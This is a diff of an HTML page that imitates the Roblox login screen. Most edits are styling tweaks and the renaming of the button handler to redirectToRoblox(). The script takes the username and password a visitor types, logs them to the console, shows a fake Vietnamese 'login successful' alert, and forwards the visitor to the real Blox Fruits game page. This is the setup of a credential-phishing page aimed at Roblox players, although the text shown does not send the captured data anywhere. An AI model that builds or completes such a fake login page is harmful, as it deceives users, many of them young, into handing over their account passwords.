@@ -8,7 +8,6 @@
         body {
             font-family: Arial, sans-serif;
             background-color: #0f0f0f;
-            color: white;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -19,20 +18,24 @@
             background-color: #1a1a1a;
             padding: 20px;
             border-radius: 10px;
-            width: 300px;
+            width: 320px;
             text-align: center;
+            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.1);
         }
         .login-container h2 {
+            color: white;
             margin-bottom: 15px;
+            font-size: 20px;
         }
         input {
             width: 100%;
             padding: 10px;
-            margin: 5px 0;
+            margin: 8px 0;
             border-radius: 5px;
             border: 1px solid #333;
             background-color: #262626;
             color: white;
+            outline: none;
         }
         button {
             width: 100%;
@@ -43,6 +46,7 @@
             background-color: #007bff;
             color: white;
             cursor: pointer;
+            font-size: 16px;
         }
         button:hover {
             background-color: #0056b3;
@@ -50,30 +54,27 @@
     </style>
 </head>
 <body>
-
     <div class="login-container">
         <h2>Login to Roblox</h2>
         <input type="text" id="username" placeholder="Username/Email/Phone">
         <input type="password" id="password" placeholder="Password">
-        <button onclick="sendLogin()">Log In</button>
+        <button onclick="redirectToRoblox()">Log In</button>
     </div>
 
     <script>
-        function sendLogin() {
+        function redirectToRoblox() {
             let username = document.getElementById("username").value;
             let password = document.getElementById("password").value;
-
+            
             console.log("User:", username);
             console.log("Password:", password);
-
+            
             alert("Đăng nhập thành công! Đang chuyển hướng...");
-
-            // Chuyển hướng đến Roblox
+            
             setTimeout(() => {
-                window.location.href = "https://www.roblox.com/vi/games/2753915549/Blox-Fruits";
+                window.location.href = "https://www.roblox.com/vi/games/2753915549/Blox-Fruits/";
             }, 1000);
         }
     </script>
-
 </body>
 </html>
